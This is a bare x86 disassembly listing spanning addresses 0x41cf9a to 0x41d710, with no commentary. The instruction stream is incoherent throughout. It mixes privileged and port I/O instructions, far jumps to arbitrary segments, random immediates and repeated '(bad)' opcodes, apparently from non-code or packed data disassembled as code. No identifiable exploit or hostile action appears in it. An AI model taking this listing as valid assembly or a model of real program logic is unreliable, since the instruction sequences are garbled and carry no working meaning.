  41cf9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf9b:	jmp    0x8790feb8
  41cfa0:	and    DWORD PTR [ebx],edi
  41cfa2:	sub    eax,DWORD PTR [eax+0x6b]
  41cfa5:	xor    al,0xbf
  41cfa7:	sub    al,0xbb
  41cfa9:	or     BYTE PTR [ecx-0x4b925a23],0x6a
  41cfb0:	mov    esp,0x88a41be6
  41cfb5:	loope  0x41cf65
  41cfb7:	stc    
  41cfb8:	push   edi
  41cfb9:	dec    ebp
  41cfba:	les    ebp,FWORD PTR [ebx-0x2874d4f8]
  41cfc0:	fistp  DWORD PTR [ebx+0x7d944133]
  41cfc6:	inc    ebx
  41cfc8:	mov    edx,0x5f678b41
  41cfcd:	nop
  41cfce:	jle    0x41cf7b
  41cfd0:	std    
  41cfd1:	aas    
  41cfd2:	xchg   edx,eax
  41cfd3:	not    DWORD PTR [ebp-0x36]
  41cfd6:	sub    edi,esi
  41cfd8:	adc    BYTE PTR [ebp+0x6fe1f26],0xef
  41cfdf:	bound  ecx,QWORD PTR [edi+eiz*4-0x5f8f7ff3]
  41cfe6:	mov    ds:0xe77774be,al
  41cfeb:	and    al,0xb0
  41cfed:	gs ins DWORD PTR es:[edi],dx
  41cfef:	xchg   edi,eax
  41cff0:	push   es
  41cff1:	iret   
  41cff2:	int    0x58
  41cff4:	sbb    bl,BYTE PTR [ecx+0x17]
  41cff7:	or     al,0x1a
  41cff9:	shl    BYTE PTR [edx+eax*8-0x3c731e19],1
  41d000:	test   edi,esp
  41d002:	inc    ebx
  41d003:	mov    DWORD PTR [ecx],esp
  41d005:	mov    dl,0xa5
  41d007:	stos   BYTE PTR es:[edi],al
  41d008:	mov    ds:0x97144ece,al
  41d00d:	dec    esp
  41d00e:	and    eax,0x85feceb6
  41d013:	int    0x0
  41d015:	push   edi
  41d016:	(bad)  
  41d018:	cs fwait
  41d01a:	daa    
  41d01b:	cmp    DWORD PTR [eax-0x54],eax
  41d01e:	fdiv   DWORD PTR [edx+eiz*1+0x668999ba]
  41d025:	mov    edi,0xc31344df
  41d02a:	les    esi,FWORD PTR [edi-0x67]
  41d02d:	adc    DWORD PTR [ebx-0x2c55ea6a],edx
  41d033:	sbb    eax,0x456982ec
  41d038:	mov    ds:0x7a58c25e,eax
  41d03d:	jp     0x41d04b
  41d03f:	pop    ds
  41d040:	mov    eax,0xf28caee1
  41d045:	mov    BYTE PTR [edi-0x47],ch
  41d048:	loopne 0x41cfd3
  41d04a:	sub    DWORD PTR [ecx],ebx
  41d04c:	xor    cl,BYTE PTR [ecx+0x6ef5d604]
  41d052:	std    
  41d053:	jnp    0x41d0b3
  41d055:	mov    esi,0x8c2f6811
  41d05a:	aaa    
  41d05b:	fimul  WORD PTR [eax-0x29]
  41d05e:	dec    eax
  41d05f:	jmp    0xd354b3ec
  41d064:	push   ebx
  41d065:	int3   
  41d066:	mov    edi,0x3fdd7a30
  41d06b:	sub    DWORD PTR [edx+0x38],eax
  41d06e:	adc    eax,0xc60ce599
  41d073:	jnp    0x41cffc
  41d075:	scas   eax,DWORD PTR es:[edi]
  41d076:	mov    eax,ds:0x7eb65a92
  41d07b:	sar    DWORD PTR [ecx+0x36f7b465],cl
  41d081:	lods   al,BYTE PTR ds:[esi]
  41d082:	xor    BYTE PTR [edx+0x7a19c5b6],ah
  41d088:	fld    QWORD PTR [ecx-0x5]
  41d08b:	jae    0x41d03a
  41d08d:	les    eax,FWORD PTR [eax+edx*2+0x13d5fe06]
  41d094:	pop    ebx
  41d095:	imul   BYTE PTR ss:[edx+edi*8+0x48a57f07]
  41d09d:	cmp    BYTE PTR [esi+0x4a],cl
  41d0a0:	dec    DWORD PTR [esi+0x29]
  41d0a3:	xchg   ebx,eax
  41d0a4:	jb     0x41d07c
  41d0a6:	bound  eax,QWORD PTR [edi]
  41d0a8:	cvttps2pi mm1,xmm7
  41d0ab:	xor    DWORD PTR [edx],eax
  41d0ad:	aaa    
  41d0ae:	repz jbe 0x41d0b6
  41d0b1:	inc    edi
  41d0b2:	xor    edi,DWORD PTR [edx+0x4d]
  41d0b5:	or     DWORD PTR [eax+0x2b060077],ebp
  41d0bb:	sti    
  41d0bc:	std    
  41d0bd:	mov    bl,ah
  41d0bf:	xchg   BYTE PTR [eax+0x4d8733cb],ch
  41d0c5:	add    DWORD PTR [edi+0x51],0x4a9a9e12
  41d0cc:	jne    0x41d125
  41d0ce:	jle    0x41d05f
  41d0d0:	cwde   
  41d0d1:	in     eax,dx
  41d0d2:	mov    al,0x23
  41d0d4:	mov    DWORD PTR [ebp-0x5d],ebp
  41d0d7:	xor    BYTE PTR ds:0xc7e28ce8,ah
  41d0dd:	xadd   BYTE PTR [eax+eax*1-0x78],bl
  41d0e2:	test   eax,0x2df0d624
  41d0e7:	add    al,BYTE PTR [ebp+0x6c5e1e21]
  41d0ed:	neg    al
  41d0ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0f0:	rol    BYTE PTR [edi+0x7fce1738],cl
  41d0f6:	mov    al,0x28
  41d0f8:	repnz jmp 0xbde0:0xdad3a034
  41d100:	jl     0x41d10d
  41d102:	jecxz  0x41d182
  41d104:	jp     0x41d132
  41d106:	jg     0xf6016053
  41d10c:	pop    edi
  41d10d:	into   
  41d10e:	mov    ecx,ebx
  41d110:	cmp    al,bh
  41d112:	in     al,dx
  41d113:	add    ebx,ecx
  41d115:	xor    BYTE PTR [ebp-0x3a7406f0],cl
  41d11b:	jnp    0x41d11f
  41d11d:	mov    esp,0x931c42e4
  41d122:	outs   dx,BYTE PTR ds:[esi]
  41d123:	not    ebp
  41d125:	xchg   esi,eax
  41d126:	add    al,0x4f
  41d128:	cmp    ah,0xcd
  41d12b:	(bad)  
  41d12c:	icebp  
  41d12d:	ja     0x41d120
  41d12f:	ins    BYTE PTR es:[edi],dx
  41d130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d131:	pop    es
  41d132:	mov    dl,0xac
  41d134:	loope  0x41d0bb
  41d136:	adc    BYTE PTR [eax],bl
  41d138:	in     al,dx
  41d139:	xor    cl,dh
  41d13b:	aas    
  41d13c:	pop    es
  41d13d:	pop    edx
  41d13e:	and    dl,BYTE PTR [ecx-0x2c08a75c]
  41d144:	sub    ebp,DWORD PTR [eax]
  41d146:	ret    
  41d147:	test   DWORD PTR [esi+edi*4],edx
  41d14a:	pushf  
  41d14b:	divps  xmm4,XMMWORD PTR [ebp-0x61]
  41d14f:	enter  0xe7cc,0x39
  41d153:	lods   al,BYTE PTR ds:[esi]
  41d154:	shl    DWORD PTR [ebx+0x22],cl
  41d157:	icebp  
  41d158:	adc    edx,DWORD PTR [ebx]
  41d15a:	pop    eax
  41d15b:	les    esi,FWORD PTR [edi+0x8ee285d]
  41d161:	pop    eax
  41d162:	xchg   ebx,eax
  41d163:	mov    esp,0x2d49a474
  41d168:	cmp    BYTE PTR [esi+0x60c6c34e],ah
  41d16e:	mov    eax,0xbdeae90c
  41d173:	xor    al,0x0
  41d175:	xlat   BYTE PTR ds:[ebx]
  41d176:	adc    eax,0xef24147f
  41d17c:	xchg   edi,eax
  41d17d:	xchg   edi,eax
  41d17e:	ds aaa 
  41d180:	aad    0x22
  41d182:	adc    eax,0xcd414dd5
  41d187:	sub    al,0xb8
  41d189:	pop    edi
  41d18a:	xor    eax,0x772650e2
  41d18f:	nop
  41d190:	cmc    
  41d191:	retf   
  41d192:	mov    cl,0xec
  41d194:	or     eax,esi
  41d196:	pop    ds
  41d197:	xchg   BYTE PTR [ecx],al
  41d199:	sub    al,0xd0
  41d19b:	push   0x1be346a3
  41d1a0:	dec    ecx
  41d1a1:	ret    0xb506
  41d1a4:	xlat   BYTE PTR ds:[ebx]
  41d1a5:	(bad)  
  41d1a6:	or     al,0x36
  41d1a8:	xchg   esp,eax
  41d1a9:	gs ret 
  41d1ab:	out    0x44,al
  41d1ad:	test   ebp,0x9a3fdd41
  41d1b3:	mov    gs,ecx
  41d1b5:	mov    bh,cl
  41d1b7:	cwde   
  41d1b8:	mov    ds:0x64c8dbb2,eax
  41d1bd:	retf   0x4504
  41d1c0:	sub    eax,0xc2421c19
  41d1c5:	xor    eax,0x27aa4421
  41d1ca:	bswap  edi
  41d1cc:	ret    
  41d1cd:	push   edx
  41d1ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1cf:	loop   0x41d185
  41d1d1:	imul   ebp,edi,0xffffffc3
  41d1d4:	mov    bl,0x89
  41d1d6:	ret    
  41d1d7:	or     ah,0xef
  41d1da:	stc    
  41d1db:	and    dh,BYTE PTR ds:[eax]
  41d1de:	lea    ecx,[ebx+eax*1+0x47]
  41d1e2:	outs   dx,BYTE PTR ds:[esi]
  41d1e3:	(bad)
  41d1e7:	add    al,0x7d
  41d1e9:	and    ch,BYTE PTR [eax]
  41d1eb:	pop    ds
  41d1ec:	ja     0x41d25d
  41d1ee:	sub    ebx,ebp
  41d1f0:	test   DWORD PTR [edi+eiz*4-0x52],edi
  41d1f4:	sbb    dh,ch
  41d1f6:	fmul   DWORD PTR [edi-0x2c3c088e]
  41d1fc:	loopne 0x41d218
  41d1fe:	ret    0xe9fb
  41d201:	enter  0x19e6,0x6c
  41d205:	add    BYTE PTR [ecx-0x565dfb89],0x6c
  41d20c:	dec    edi
  41d20d:	clc    
  41d20e:	std    
  41d20f:	or     DWORD PTR [ecx+0x43d5eab2],0xfffffff2
  41d216:	bound  esi,QWORD PTR [ebx]
  41d218:	xchg   ebp,eax
  41d219:	inc    esi
  41d21a:	pop    esp
  41d21b:	out    0x38,al
  41d21d:	std    
  41d21e:	scas   eax,DWORD PTR es:[edi]
  41d21f:	retf   0x970f
  41d222:	lock sbb ch,al
  41d225:	fadd   st(5),st
  41d227:	ins    BYTE PTR es:[edi],dx
  41d228:	pop    ss
  41d229:	fs pop edi
  41d22b:	mov    BYTE PTR [esi],cl
  41d22d:	xor    BYTE PTR fs:[ecx],ch
  41d230:	(bad)  
  41d231:	(bad)  
  41d232:	mov    cl,0x39
  41d234:	jo     0x41d20c
  41d236:	leave  
  41d237:	push   es
  41d238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d239:	or     eax,0xb80aff43
  41d23e:	inc    ebx
  41d23f:	dec    esi
  41d240:	cmp    al,0x77
  41d242:	mov    esi,0x35fa50aa
  41d247:	push   ebx
  41d248:	inc    eax
  41d249:	bound  esp,QWORD PTR [eax+ebx*4]
  41d24c:	das    
  41d24d:	inc    esp
  41d24e:	mov    ah,BYTE PTR [ecx-0x45]
  41d251:	enter  0xc691,0x32
  41d255:	out    0xbe,eax
  41d257:	push   ecx
  41d258:	(bad)  
  41d259:	retf   0x4180
  41d25c:	ficom  DWORD PTR [ebx]
  41d25e:	mov    WORD PTR [ecx-0x26],fs
  41d261:	pop    esp
  41d262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d263:	enter  0x1d03,0x63
  41d267:	xor    dh,0x26
  41d26a:	out    0x7a,eax
  41d26c:	inc    eax
  41d26d:	push   ds
  41d26e:	sti    
  41d26f:	cmp    BYTE PTR [eax+0x641a61d1],al
  41d275:	inc    ebx
  41d276:	jnp    0x41d247
  41d278:	mov    cl,0x1b
  41d27a:	repz rol BYTE PTR ds:0x371c9df6,cl
  41d281:	cmp    al,0xf7
  41d283:	lahf   
  41d284:	lock sti 
  41d286:	inc    ebp
  41d287:	fcmovu st,st(3)
  41d289:	fldcw  WORD PTR [edi+0x51532f09]
  41d28f:	inc    ecx
  41d290:	ds inc edi
  41d292:	enter  0x1410,0x10
  41d296:	xchg   esp,eax
  41d297:	inc    eax
  41d298:	in     al,dx
  41d299:	jl     0x41d300
  41d29b:	xchg   edx,eax
  41d29c:	xchg   eax,edi
  41d29e:	scas   eax,DWORD PTR es:[edi]
  41d29f:	call   0x12e6:0x50784fd8
  41d2a6:	push   esp
  41d2a7:	xor    al,0xce
  41d2a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2aa:	or     BYTE PTR [ebp+edi*1-0x7d],bh
  41d2ae:	mov    dl,0x85
  41d2b0:	sbb    eax,0x2acddaf4
  41d2b5:	es pushf 
  41d2b7:	xchg   BYTE PTR [edx],al
  41d2b9:	(bad)  
  41d2ba:	xchg   ebx,eax
  41d2bb:	test   al,0xe1
  41d2bd:	xor    BYTE PTR ds:0x63dd2818,cl
  41d2c3:	ss ins BYTE PTR es:[edi],dx
  41d2c5:	(bad)  
  41d2c6:	(bad)  
  41d2c8:	push   eax
  41d2c9:	dec    esi
  41d2ca:	test   DWORD PTR [ebp+0x5b],esp
  41d2cd:	in     eax,0x15
  41d2cf:	jp     0x41d2ff
  41d2d1:	popa   
  41d2d2:	into   
  41d2d3:	inc    edi
  41d2d4:	cmc    
  41d2d5:	aaa    
  41d2d6:	mov    BYTE PTR [eax+0x73],al
  41d2d9:	aaa    
  41d2da:	test   eax,0xee0eb8dd
  41d2df:	mov    cl,0x98
  41d2e1:	repz add BYTE PTR [bp+di+0xe],0x19
  41d2e7:	clc    
  41d2e8:	dec    edx
  41d2e9:	mov    cl,0x8f
  41d2eb:	sti    
  41d2ec:	xchg   BYTE PTR [ebx+0x5519fa39],ch
  41d2f2:	sbb    al,BYTE PTR [ebp+esi*4-0x7d3c1ce4]
  41d2f9:	push   edi
  41d2fa:	repnz sub eax,0x75f33995
  41d300:	ror    DWORD PTR [esi],0x39
  41d303:	les    edi,FWORD PTR [ecx-0x6099fc18]
  41d309:	inc    esi
  41d30a:	in     al,dx
  41d30b:	nop
  41d30c:	mov    bl,0xdd
  41d30e:	call   0x5a9e:0x4c610193
  41d315:	cmp    ebp,DWORD PTR [ebx-0x58]
  41d318:	sahf   
  41d319:	mul    BYTE PTR [ebp-0x6c]
  41d31c:	aam    0x33
  41d31e:	adc    eax,0x1bf1b3ce
  41d323:	into   
  41d324:	in     eax,dx
  41d325:	out    dx,eax
  41d326:	(bad)  
  41d327:	shl    BYTE PTR gs:[edi-0x56edf2d8],1
  41d32e:	push   esp
  41d32f:	rcr    DWORD PTR [esi],1
  41d331:	push   es
  41d332:	mov    ds:0x5ff04fca,al
  41d337:	mov    al,ds:0xc58061a3
  41d33c:	pop    ss
  41d33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d33e:	dec    edx
  41d33f:	fs cmp al,0xf1
  41d342:	aaa    
  41d343:	push   ebp
  41d344:	dec    ebx
  41d345:	jle    0x41d301
  41d347:	daa    
  41d348:	sahf   
  41d349:	aad    0x6c
  41d34b:	les    ecx,FWORD PTR [ebp-0xa]
  41d34e:	stos   BYTE PTR es:[edi],al
  41d34f:	es inc ebp
  41d351:	(bad)  
  41d352:	es jns 0x41d333
  41d355:	mov    esp,0x267ce465
  41d35a:	xlat   BYTE PTR ds:[ebx]
  41d35b:	dec    esp
  41d35c:	aad    0x8d
  41d35e:	xchg   ebp,eax
  41d35f:	mov    ds:0xf89f9fb9,al
  41d364:	sub    BYTE PTR ds:0xdcb93f2d,ah
  41d36a:	sbb    BYTE PTR [ebx],0xd
  41d36d:	push   ebx
  41d36e:	fnstenv gs:[edi+ebp*4+0x1d]
  41d373:	mov    edi,0xb6242700
  41d378:	lods   eax,DWORD PTR ds:[esi]
  41d379:	add    ah,BYTE PTR ds:0x967ccdb2
  41d37f:	mov    eax,ds:0x20be95bb
  41d384:	jns    0x41d3e1
  41d386:	pop    esi
  41d387:	sub    edx,DWORD PTR [eax]
  41d389:	repnz ficom WORD PTR [eax-0x31]
  41d38d:	dec    ebp
  41d38e:	pushf  
  41d38f:	loope  0x41d358
  41d391:	retf   
  41d392:	mov    ebp,0xda2c9037
  41d397:	cwde   
  41d398:	xchg   edx,eax
  41d399:	inc    ebp
  41d39a:	lock int 0x43
  41d39d:	popf   
  41d39e:	(bad)  
  41d3a0:	lahf   
  41d3a1:	pop    ebp
  41d3a2:	xchg   edx,eax
  41d3a3:	sub    BYTE PTR [eax+ebp*2],ch
  41d3a6:	in     al,dx
  41d3a7:	sub    BYTE PTR [ecx+0x3b],ch
  41d3aa:	jge    0x41d3ba
  41d3ac:	mov    ds:0xd37a8eac,eax
  41d3b1:	jb     0x41d3bc
  41d3b3:	or     ch,BYTE PTR [ebx]
  41d3b5:	(bad)  
  41d3b6:	into   
  41d3b7:	test   eax,0x3806725a
  41d3bc:	call   0x792e3f60
  41d3c1:	push   ecx
  41d3c2:	outs   dx,DWORD PTR ds:[esi]
  41d3c3:	mov    eax,0xab08b0e
  41d3c8:	jl     0x41d396
  41d3ca:	(bad)  
  41d3cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3cc:	inc    esi
  41d3cd:	mov    al,0x65
  41d3cf:	inc    ebp
  41d3d0:	sbb    edi,DWORD PTR [ecx]
  41d3d2:	dec    esp
  41d3d3:	and    DWORD PTR [ebp+0xb9a7db9],ecx
  41d3d9:	or     eax,ebx
  41d3db:	data16 mov ch,0xf1
  41d3de:	push   edx
  41d3df:	push   esp
  41d3e0:	in     eax,dx
  41d3e1:	push   esi
  41d3e2:	add    eax,0xa45dad41
  41d3e7:	fwait
  41d3e8:	(bad)  
  41d3e9:	daa    
  41d3ea:	sub    ecx,ebp
  41d3ec:	les    esi,FWORD PTR [ebx+ecx*4+0x2bd1a382]
  41d3f3:	pop    ds
  41d3f4:	sbb    ebp,esp
  41d3f6:	jne    0x41d3cf
  41d3f8:	cmp    al,0x29
  41d3fa:	mov    WORD PTR [ebx-0x30],ds
  41d3fd:	xchg   BYTE PTR [eax+0x4e9d4e79],ah
  41d403:	fsubr  QWORD PTR [ebx-0x7fa0d8c1]
  41d409:	cwde   
  41d40a:	add    eax,0xa723fcd8
  41d40f:	data16 sbb al,0x61
  41d412:	mul    BYTE PTR [ebx]
  41d414:	mov    ebp,0x890f5947
  41d419:	sbb    BYTE PTR [edi+0x5aa1c1fb],dl
  41d41f:	mov    ds:0x87878782,al
  41d424:	fs cmc 
  41d426:	jmp    0xfcd3f6b6
  41d42b:	es mov bh,0x40
  41d42e:	jl     0x41d3b9
  41d430:	test   DWORD PTR [eax+0x1b],ecx
  41d433:	jne    0x41d3d8
  41d435:	vpmaxub xmm0,xmm0,XMMWORD PTR [eax]
  41d439:	loopne 0x41d4a3
  41d43b:	imul   ecx,DWORD PTR [edx-0x641ac2f],0x8661bf00
  41d445:	sub    esi,DWORD PTR ds:0x91c8854a
  41d44b:	xor    DWORD PTR [ebx-0x1c],edi
  41d44e:	outs   dx,BYTE PTR ds:[esi]
  41d44f:	push   esp
  41d450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d451:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41d453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d455:	ror    BYTE PTR [eax+0x76],1
  41d458:	ins    DWORD PTR es:[edi],dx
  41d459:	lods   eax,DWORD PTR ds:[esi]
  41d45a:	out    0xf2,eax
  41d45c:	test   BYTE PTR [esi+edi*8+0x2197f345],0xde
  41d464:	mov    bp,0xe0ce
  41d468:	sub    dl,ah
  41d46a:	sbb    eax,0x397288d3
  41d46f:	sub    al,0xad
  41d471:	add    DWORD PTR [edi+0x39],edx
  41d474:	aad    0x8b
  41d476:	jg     0x41d442
  41d478:	cli    
  41d479:	pop    es
  41d47a:	add    DWORD PTR [ecx],0x7d
  41d47d:	je     0x41d41d
  41d47f:	sub    al,0xdb
  41d481:	mov    ds:0x8aee9e9c,eax
  41d486:	mov    eax,ds:0x99522931
  41d48b:	mov    edi,0x27226cca
  41d490:	push   cs
  41d491:	fimul  DWORD PTR [edi+0x6b294e0d]
  41d497:	call   0x36b5:0xcc3e0cc7
  41d49e:	sbb    eax,0xb1a40303
  41d4a3:	sub    esp,ecx
  41d4a5:	and    bl,BYTE PTR [edi+esi*4-0x567fb2f]
  41d4ac:	imul   eax,DWORD PTR [ebp+eax*2+0x4b2dea2e],0x57
  41d4b4:	div    BYTE PTR [edi]
  41d4b6:	lods   eax,DWORD PTR ds:[esi]
  41d4b7:	pop    edx
  41d4b8:	and    al,0xce
  41d4ba:	mov    bh,0x9a
  41d4bc:	or     ah,cl
  41d4be:	jp     0x41d4d1
  41d4c0:	stc    
  41d4c1:	jno    0x41d444
  41d4c3:	and    DWORD PTR [edx-0x61ed43f2],ecx
  41d4c9:	lahf   
  41d4ca:	adc    ebp,DWORD PTR [edx]
  41d4cc:	mov    eax,ds:0x22d2aa3f
  41d4d1:	popa   
  41d4d2:	test   al,0x84
  41d4d4:	xor    al,0xc
  41d4d6:	rcr    BYTE PTR [ecx-0x76f4bd2c],0x97
  41d4dd:	push   ss
  41d4de:	(bad)  
  41d4df:	jno    0x41d49d
  41d4e1:	imul   edx,DWORD PTR [edi],0xffffff8a
  41d4e4:	out    0x6,al
  41d4e6:	js     0x41d564
  41d4e8:	inc    esp
  41d4e9:	(bad)  
  41d4ea:	cmp    esp,DWORD PTR [eax+eiz*8+0x53]
  41d4ee:	iret   
  41d4ef:	fcom   st(4)
  41d4f1:	int3   
  41d4f2:	je     0x41d51e
  41d4f4:	sub    al,0xe8
  41d4f6:	jecxz  0x41d554
  41d4f8:	sub    dl,BYTE PTR [ecx]
  41d4fa:	pop    ebx
  41d4fb:	mov    ds:0x8bc589ad,eax
  41d500:	adc    al,0xb4
  41d502:	lods   eax,DWORD PTR ds:[esi]
  41d503:	xchg   ebp,eax
  41d504:	inc    edx
  41d505:	cld    
  41d506:	in     eax,dx
  41d507:	mov    ecx,0xa7f670a2
  41d50c:	in     al,0x57
  41d50e:	xchg   esp,eax
  41d50f:	mov    al,0x44
  41d511:	es call 0xed0:0x5b647c08
  41d519:	cmp    DWORD PTR [ebx+ecx*4],esi
  41d51c:	jns    0x41d4e1
  41d51e:	imul   edx,DWORD PTR [ebp+0x17],0x5b
  41d522:	rcl    DWORD PTR [eax+0x15055acf],cl
  41d528:	sbb    bl,ah
  41d52a:	and    eax,0xf8c00fed
  41d52f:	and    ebx,esi
  41d531:	loop   0x41d592
  41d533:	retf   0xfb86
  41d536:	mov    BYTE PTR [ecx],bh
  41d538:	cmp    DWORD PTR [ecx],ecx
  41d53a:	mov    edi,DWORD PTR [ecx+esi*2]
  41d53d:	mov    dl,0x60
  41d53f:	jnp    0x41d583
  41d541:	and    ebp,ebp
  41d543:	mov    eax,ds:0x681721b2
  41d548:	out    dx,al
  41d549:	loop   0x41d50a
  41d54b:	ja     0x41d55f
  41d54d:	enter  0xbcd,0xad
  41d551:	idiv   DWORD PTR [esi-0x5e]
  41d554:	mov    dh,ch
  41d556:	xor    eax,edx
  41d558:	stos   BYTE PTR es:[edi],al
  41d559:	lea    eax,[ecx+0x3a38a19a]
  41d55f:	xor    ebp,DWORD PTR [esi+0x69]
  41d562:	std    
  41d563:	clc    
  41d564:	std    
  41d565:	xor    eax,0xa14b711b
  41d56a:	jns    0x41d562
  41d56c:	push   cs
  41d56d:	aas    
  41d56e:	out    dx,al
  41d56f:	mov    eax,0x16341863
  41d574:	xor    eax,0x56e69081
  41d579:	push   0x57c4e6d3
  41d57e:	jmp    ecx
  41d580:	and    dl,ch
  41d582:	jo     0x41d5c4
  41d584:	mov    ch,0xc8
  41d586:	adc    al,0x48
  41d588:	and    ch,BYTE PTR [esi-0x35]
  41d58b:	or     eax,0x3d5182e8
  41d590:	inc    ebx
  41d591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d592:	xor    al,0xd4
  41d594:	add    DWORD PTR [ebx-0x2e],esp
  41d597:	lock xlat BYTE PTR ds:[ebx]
  41d599:	es lahf 
  41d59b:	push   edx
  41d59c:	add    DWORD PTR [edx-0x1bbfbdab],ebp
  41d5a2:	and    DWORD PTR [edx+0x31fc1f52],edx
  41d5a8:	test   BYTE PTR [edx+0x630864ef],ah
  41d5ae:	push   ebx
  41d5af:	rol    BYTE PTR [edi+0x6145632d],cl
  41d5b5:	je     0x41d5e9
  41d5b7:	push   0x76
  41d5b9:	test   eax,0x5113b76f
  41d5be:	ja     0x41d5a4
  41d5c0:	inc    eax
  41d5c1:	popf   
  41d5c2:	fucomip st,st(4)
  41d5c4:	stos   DWORD PTR es:[edi],eax
  41d5c5:	jge    0x41d548
  41d5c7:	cmp    BYTE PTR [edx],0xc3
  41d5ca:	sub    al,0x4b
  41d5cc:	rol    cl,1
  41d5ce:	or     BYTE PTR [edx-0x5ae2c5d3],bl
  41d5d4:	add    eax,0x970af488
  41d5d9:	aas    
  41d5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5db:	mov    ecx,0xa5cfc35b
  41d5e0:	jg     0x41d627
  41d5e2:	pop    eax
  41d5e3:	lods   al,BYTE PTR ds:[esi]
  41d5e4:	mov    al,ds:0xb4f1d652
  41d5e9:	mov    cl,0xa
  41d5eb:	push   es
  41d5ec:	fcmovbe st,st(4)
  41d5ee:	push   ebx
  41d5ef:	loopne 0x41d577
  41d5f1:	les    ecx,FWORD PTR [eax]
  41d5f3:	(bad)  
  41d5f4:	(bad)  
  41d5f5:	in     eax,0x44
  41d5f7:	cmp    BYTE PTR [edx],al
  41d5f9:	(bad)  
  41d5fa:	fistp  DWORD PTR [edx]
  41d5fc:	pop    es
  41d5fd:	lods   eax,DWORD PTR ds:[esi]
  41d5fe:	jp     0x41d59f
  41d600:	rcl    esp,0x8e
  41d603:	das    
  41d604:	cmc    
  41d605:	push   es
  41d606:	call   0xe7a3:0x1c8a7bc
  41d60d:	(bad)  
  41d60e:	jecxz  0x41d5a0
  41d610:	in     al,dx
  41d611:	xchg   DWORD PTR [ebx-0x39],ecx
  41d614:	jnp    0x41d67f
  41d616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d617:	cmc    
  41d618:	repnz cmc 
  41d61a:	sub    al,0x68
  41d61c:	adc    al,0x58
  41d61e:	fs dec esp
  41d620:	shr    ebp,0xfc
  41d623:	mov    eax,0x6b6ed3cc
  41d628:	std    
  41d629:	xor    eax,ebp
  41d62b:	enter  0xe01c,0xb4
  41d62f:	add    BYTE PTR [eax+0x4c],dh
  41d632:	ins    DWORD PTR es:[edi],dx
  41d633:	hlt    
  41d634:	cmp    ch,ch
  41d636:	dec    eax
  41d637:	push   ecx
  41d638:	adc    ebx,ebx
  41d63a:	cdq    
  41d63b:	in     eax,0x30
  41d63d:	push   ebx
  41d63e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d63f:	jno    0x41d5d8
  41d641:	or     dh,BYTE PTR [ebx+edi*1]
  41d644:	(bad)  [ecx]
  41d646:	jle    0x41d5f0
  41d648:	cwde   
  41d649:	retf   0x7346
  41d64c:	cmp    al,0x3d
  41d64e:	imul   edi,edx,0xf06a229b
  41d654:	shr    edx,0xbe
  41d657:	jge    0x41d64e
  41d659:	push   esi
  41d65a:	fisubr WORD PTR [edx-0x28c21194]
  41d660:	jecxz  0x41d684
  41d662:	add    BYTE PTR [ecx-0x490ed37a],ah
  41d668:	jmp    0xe8e3:0x502d68d
  41d66f:	inc    eax
  41d670:	icebp  
  41d671:	dec    BYTE PTR [eax]
  41d673:	sbb    al,0x56
  41d675:	nop
  41d676:	shl    BYTE PTR [ebx+0x18],0x8
  41d67a:	cmp    eax,0x3985f886
  41d67f:	jecxz  0x41d6b8
  41d681:	aam    0x57
  41d683:	jecxz  0x41d701
  41d685:	in     al,dx
  41d686:	sbb    edx,DWORD PTR [eax+0x1d]
  41d689:	mov    bh,0xec
  41d68b:	cld    
  41d68c:	icebp  
  41d68d:	ret    0x3b9f
  41d690:	stos   BYTE PTR es:[edi],al
  41d691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d692:	dec    ebp
  41d693:	std    
  41d694:	out    dx,al
  41d695:	and    eax,0x92eca4a0
  41d69a:	dec    ebx
  41d69b:	aaa    
  41d69c:	mov    ds:0xd7c4182c,al
  41d6a1:	iret   
  41d6a2:	out    0xa8,eax
  41d6a4:	in     eax,dx
  41d6a5:	adc    eax,0xddc40e15
  41d6aa:	inc    esp
  41d6ab:	mov    esi,0x5141b980
  41d6b0:	xchg   edx,eax
  41d6b1:	pop    ebp
  41d6b2:	pop    eax
  41d6b3:	cli    
  41d6b4:	xor    DWORD PTR [esi],edi
  41d6b6:	adc    BYTE PTR ss:[eax],al
  41d6b9:	cmp    al,BYTE PTR [eax+0x35]
  41d6bc:	mov    ch,al
  41d6be:	cmp    eax,0x848d65fe
  41d6c3:	sub    eax,eax
  41d6c5:	dec    esi
  41d6c6:	ret    0xb83c
  41d6c9:	retf   
  41d6ca:	aas    
  41d6cb:	inc    esi
  41d6cc:	es pop es
  41d6ce:	loopne 0x41d6cf
  41d6d0:	mov    ebx,0x98ca0923
  41d6d5:	push   0xd4654bf4
  41d6da:	mov    ebx,0x5a3c6e12
  41d6df:	xor    esi,DWORD PTR [edx+0x49ef4b56]
  41d6e5:	mov    cl,0x1b
  41d6e7:	mov    esp,0x7a66acc3
  41d6ec:	mov    ah,0x50
  41d6ee:	lock jge 0x41d6cb
  41d6f1:	jge    0x41d6f5
  41d6f3:	dec    ebx
  41d6f4:	jg     0x41d75d
  41d6f6:	pop    ds
  41d6f7:	popf   
  41d6f8:	xor    eax,0x5b160b0e
  41d6fd:	in     al,dx
  41d6fe:	pop    esi
  41d6ff:	inc    esi
  41d700:	pop    ebx
  41d701:	repnz mov WORD PTR [ebp+0xcbb0fd9],es
  41d708:	xchg   ebp,eax
  41d709:	hlt    
  41d70a:	mov    bl,0xd4
  41d70c:	xlat   BYTE PTR ds:[ebx]
  41d70d:	into   
  41d70e:	bound  esp,QWORD PTR [ecx]
  41d710:	add    BYTE PTR [ecx],bh
